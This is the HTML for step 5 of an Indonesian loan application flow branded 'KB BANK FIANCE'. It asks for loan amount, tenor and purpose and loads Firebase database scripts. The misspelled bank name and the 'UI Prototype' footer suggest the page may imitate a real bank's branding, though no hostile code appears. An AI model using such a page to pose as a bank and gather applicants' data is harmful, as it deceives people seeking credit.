<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>KB BANK FIANCE — Form Pinjaman</title>
  <link rel="stylesheet" href="style.css">
  <link rel="stylesheet" href="flow.css">
</head>
<body class="flow-page">
  <main class="flow-shell">
    <section class="flow-hero">
      <div class="flow-top">
        <button class="flow-back" id="backButton" type="button">←</button>
        <button class="flow-lang" type="button">ID 🇮🇩</button>
      </div>
      <div class="flow-copy">
        <div class="flow-step">Tahap 5</div>
        <h1>Form Pinjaman</h1>
        <p>Pilih nominal dan tenor sesuai kebutuhan Anda.</p>
      </div>
    </section>
    
<section class="flow-card">
  <div class="flow-title">
    <h2>Rencana Pinjaman</h2>
    <p>Atur nominal, tenor, dan tujuan penggunaan dana.</p>
  </div>
  <form id="loanForm">
    <div class="flow-field">
      <label for="amount">Nominal Pinjaman</label>
      <div class="flow-input"><span>Rp</span><input id="amount" type="number" min="1000000" max="75000000" step="500000" value="25000000"></div>
    </div>
    <div class="flow-field">
      <label for="tenor">Tenor</label>
      <div class="flow-input">
        <select id="tenor">
          <option value="6">6 Bulan</option><option value="12" selected>12 Bulan</option>
          <option value="18">18 Bulan</option><option value="24">24 Bulan</option><option value="36">36 Bulan</option>
        </select>
      </div>
    </div>
    <div class="flow-field">
      <label for="purpose">Tujuan Pinjaman</label>
      <div class="flow-input">
        <select id="purpose">
          <option>Modal Usaha</option><option>Renovasi Rumah</option><option>Pendidikan</option><option>Kebutuhan Pribadi</option>
        </select>
      </div>
    </div>
    <div class="summary-total">
      <span>Estimasi angsuran per bulan</span>
      <strong id="monthly">Rp0</strong>
    </div>
    <button class="flow-button" type="submit">LIHAT RINGKASAN →</button>
  </form>
</section>
  </main>
  <div style="padding:10px 16px;text-align:center;font-size:10px;line-height:1.5;color:#7c6f89;background:#f7f1fd;border-top:1px solid #eadcf8">
<strong>UI Prototype</strong> — Alur, status, dan hasil pada halaman ini merupakan Pengajuan Credit
</div>

<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
<script src="storage.js"></script>
<script src="form-pinjaman.js"></script>

</body>
</html>
